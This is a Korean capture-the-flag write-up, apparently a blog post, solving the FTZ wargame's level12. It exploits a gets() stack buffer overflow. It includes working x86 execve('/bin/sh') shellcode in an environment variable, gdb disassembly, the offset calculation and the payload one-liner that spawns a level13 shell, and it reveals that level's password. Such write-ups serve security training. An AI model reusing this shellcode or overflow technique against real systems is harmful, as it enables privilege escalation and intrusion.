@@ -1,0 +1,160 @@
+I"K <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level12 
+level12@~~~~<span class="s1">'s password: 
+[level12@ftz level12]$ ls 
+attackme  hint  public_html  tmp 
+[level12@ftz level12]$ cat hint 
+
+
+#include  &lt;stdio.h&gt;
+#include  &lt;stdlib.h&gt;
+#include  &lt;unistd.h&gt;
+
+int main( void ) 
+{ 
+        char str[256]; 
+
+        setreuid( 3093, 3093 ); 
+        printf( "문장을 입력하세요.\n" ); 
+        gets( str ); 
+        printf( "%s\n", str ); 
+} 
+
+
+[level12@ftz level12]$
+</span></code></pre></div></div>
+
+<p>level12/it is like this로 로그인하자.</p>
+
+<p>hint파일을 보니, level11과 거의 다름이 없다.</p>
+
+<p>strcpy–&gt;gets 정도?</p>
+
+<p>level11과 같은 방법으로 풀어보자.</p>
+
+<p>우선 환경변수부터.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*100+"\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>주소도 같은 프로그램으로 구하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level12@ftz level12]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>find  find.c  mysql.sock 
+<span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c 
+<span class="c">#include &lt;stdio.h&gt;</span>
+int main<span class="o">()</span> 
+<span class="o">{</span> 
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span> 
+<span class="o">}</span> 
+<span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span>./find 
+bfffff14[level12@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>bfffff14다.</p>
+
+<p>이제 파일을 컴파일하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level12@ftz level12]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/bof.c 
+<span class="o">[</span>level12@ftz level12]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>bof.c 
+
+
+<span class="c">#include  &lt;stdio.h&gt;</span>
+<span class="c">#include  &lt;stdlib.h&gt;</span>
+<span class="c">#include  &lt;unistd.h&gt;</span>
+
+int main<span class="o">(</span> void <span class="o">)</span> 
+<span class="o">{</span> 
+        char str[256]<span class="p">;</span> 
+
+        setreuid<span class="o">(</span> 3093, 3093 <span class="o">)</span><span class="p">;</span> 
+        <span class="nb">printf</span><span class="o">(</span> <span class="s2">"문장을 입력하세요.</span><span class="se">\n</span><span class="s2">"</span> <span class="o">)</span><span class="p">;</span> 
+        gets<span class="o">(</span> str <span class="o">)</span><span class="p">;</span> 
+        <span class="nb">printf</span><span class="o">(</span> <span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, str <span class="o">)</span><span class="p">;</span> 
+<span class="o">}</span> 
+
+
+<span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
+/tmp/cc8hCS5B.o<span class="o">(</span>.text+0x43<span class="o">)</span>: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">': 
+: the `gets'</span> <span class="k">function </span>is dangerous and should not be used. 
+<span class="o">[</span>level12@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>dbg로 파일을 분석하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level12@ftz tmp]<span class="nv">$ </span>gdb bof 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048390 &lt;main+0&gt;:    push   ebp 
+0x08048391 &lt;main+1&gt;:    mov    ebp,esp 
+0x08048393 &lt;main+3&gt;:    sub    esp,0x108 
+0x08048399 &lt;main+9&gt;:    and    esp,0xfffffff0 
+0x0804839c &lt;main+12&gt;:   mov    eax,0x0 
+0x080483a1 &lt;main+17&gt;:   sub    esp,eax 
+0x080483a3 &lt;main+19&gt;:   sub    esp,0x8 
+0x080483a6 &lt;main+22&gt;:   push   0xc15 
+0x080483ab &lt;main+27&gt;:   push   0xc15 
+0x080483b0 &lt;main+32&gt;:   call   0x80482d0  
+0x080483b5 &lt;main+37&gt;:   add    esp,0x10 
+0x080483b8 &lt;main+40&gt;:   sub    esp,0xc 
+0x080483bb &lt;main+43&gt;:   push   0x80484a0 
+0x080483c0 &lt;main+48&gt;:   call   0x80482c0  
+0x080483c5 &lt;main+53&gt;:   add    esp,0x10 
+0x080483c8 &lt;main+56&gt;:   sub    esp,0xc 
+0x080483cb &lt;main+59&gt;:   lea    eax,[ebp-264] 
+0x080483d1 &lt;main+65&gt;:   push   eax 
+0x080483d2 &lt;main+66&gt;:   call   0x80482a0  
+0x080483d7 &lt;main+71&gt;:   add    esp,0x10 
+0x080483da &lt;main+74&gt;:   sub    esp,0x8 
+0x080483dd &lt;main+77&gt;:   lea    eax,[ebp-264] 
+0x080483e3 &lt;main+83&gt;:   push   eax 
+0x080483e4 &lt;main+84&gt;:   push   0x80484b4 
+0x080483e9 &lt;main+89&gt;:   call   0x80482c0  
+0x080483ee &lt;main+94&gt;:   add    esp,0x10 
+0x080483f1 &lt;main+97&gt;:   leave 
+0x080483f2 &lt;main+98&gt;:   ret 
+0x080483f3 &lt;main+99&gt;:   nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>더미 크기까지 똑같다.</p>
+
+<p>전과 같이 str(256) +dummy(8) + SFP(4) =268.</p>
+
+<p>아무 값이나 268개 채우자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level12@ftz level12]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*268+"\x14\xff\xff\xbf"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span> | ./attackme 
+문장을 입력하세요. 
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱? 
+<span class="nb">whoami 
+</span>level13
+</code></pre></div></div>
+
+<p>이번엔 전과 조금 코드에 차이가 있다.</p>
+
+<p>;cat과 ./attack이 뒤에 있다는 점이다.</p>
+
+<p>이 프로그램은 실행과 동시에 인좌를 받는 것이 아니라 사용자의 입력을 기다린다.</p>
+
+<p>그러므로 파이프를 통해 위의 코드를 보내주는 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>my-pass 
+TERM environment variable not set. 
+
+Level13 Password is <span class="s2">"have no clue"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>답을 구했다.</p>
+
+<p>level13’s password:have no clue”</p>
+:ET
